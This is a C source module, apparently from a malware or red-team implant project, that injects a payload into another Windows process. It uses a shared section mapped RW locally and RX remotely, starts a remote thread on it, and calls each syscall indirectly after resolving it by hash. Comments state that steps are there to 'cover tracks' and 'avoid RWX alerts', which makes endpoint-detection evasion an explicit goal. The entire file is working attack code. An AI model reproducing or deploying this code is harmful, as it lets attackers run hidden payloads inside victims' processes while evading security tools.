#include "Modules/injection.h"
#include "Core/syscalls.h"
#include "Utils/helpers.h"

//process injection (section-based with local/remote view mapping)
bool Internal_Inject(DWORD targetPid, PBYTE payload, SIZE_T payloadSize) {
    HANDLE hProcess = NULL;
    HANDLE hSection = NULL;
    HANDLE hThread = NULL;
    PVOID localView = NULL;
    PVOID remoteView = NULL;
    NTSTATUS status;
    SYSCALL_GATE gate;
    
    //casting for PID and use of LARGE_INTEGER
    CLIENT_ID cid = { (HANDLE)(ULONG_PTR)targetPid, NULL };
    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
    
    LARGE_INTEGER sectionSize;
    sectionSize.QuadPart = payloadSize;
    SIZE_T viewSize = 0; // 0 -> map the whole section

    // 1. NtOpenProcess
    gate = GetSSNByHash(0X97AD5B76BAD29574);
    if (gate.wServiceId == 0) return false;
    PREPARE_SYSCALL(gate);
    status = IndirectSyscall((ULONG_PTR)&hProcess, PROCESS_ALL_ACCESS, (ULONG_PTR)&objAttr, (ULONG_PTR)&cid, 0, 0, 0, 0, 0, 0, 0);
    if (status != 0) return false;

    //NtCreateSection (section -> PAGE_EXECUTE_READWRITE -> support views)
    gate = GetSSNByHash(0x6E867168A04D622F);
    PREPARE_SYSCALL(gate);
    status = IndirectSyscall((ULONG_PTR)&hSection, SECTION_ALL_ACCESS, (ULONG_PTR)NULL, (ULONG_PTR)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, (ULONG_PTR)NULL, 0, 0, 0, 0);
    
    if (status == 0) {
        //NtMapViewOfSection (Local) - only PAGE_READWRITE in our process
        gate = GetSSNByHash(0X582268225F6375BB);
        PREPARE_SYSCALL(gate);
        status = IndirectSyscall((ULONG_PTR)hSection, (ULONG_PTR)-1, (ULONG_PTR)&localView, 0, 0, (ULONG_PTR)NULL, (ULONG_PTR)&viewSize, 2, 0, PAGE_READWRITE, 0);
        
        if (status == 0) {
            //payload transfer
            custom_memcpy(localView, payload, payloadSize);

            //NtUnmapViewOfSection [local cleanup - cover tracks]
            SYSCALL_GATE unmapGate = GetSSNByHash(0X7E80D9001289B775);
            wSystemCall = unmapGate.wServiceId;
            IndirectSyscall((ULONG_PTR)-1, (ULONG_PTR)localView, 0, 0, 0, 0, 0, 0, 0, 0, 0);
        }

        //NtMapViewOfSection - only PAGE_EXECUTE_READ (RX) in Target [avoid RWX alerts]
        gate = GetSSNByHash(0X582268225F6375BB);
        PREPARE_SYSCALL(gate);
        viewSize = 0; 
        status = IndirectSyscall((ULONG_PTR)hSection, (ULONG_PTR)hProcess, (ULONG_PTR)&remoteView, 0, 0, (ULONG_PTR)NULL, (ULONG_PTR)&viewSize, 2, 0, PAGE_EXECUTE_READ, 0);

        if (status == 0) {
            //NtCreateThreadEx
            gate = GetSSNByHash(0X1D6069E813CB80CA);
            PREPARE_SYSCALL(gate);
            status = IndirectSyscall((ULONG_PTR)&hThread, THREAD_ALL_ACCESS, (ULONG_PTR)NULL, (ULONG_PTR)hProcess, (ULONG_PTR)remoteView, (ULONG_PTR)NULL, 0, 0, 0, 0, (ULONG_PTR)NULL);
        }
    }

    //full cleanup [NtClose handles to avoid resource leaks]
    gate = GetSSNByHash(0X5E575BD8ACC77BC0);
    PREPARE_SYSCALL(gate);
    if (hThread)  IndirectSyscall((ULONG_PTR)hThread, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
    if (hSection) IndirectSyscall((ULONG_PTR)hSection, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
    if (hProcess) IndirectSyscall((ULONG_PTR)hProcess, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);

    return (status == 0);
}
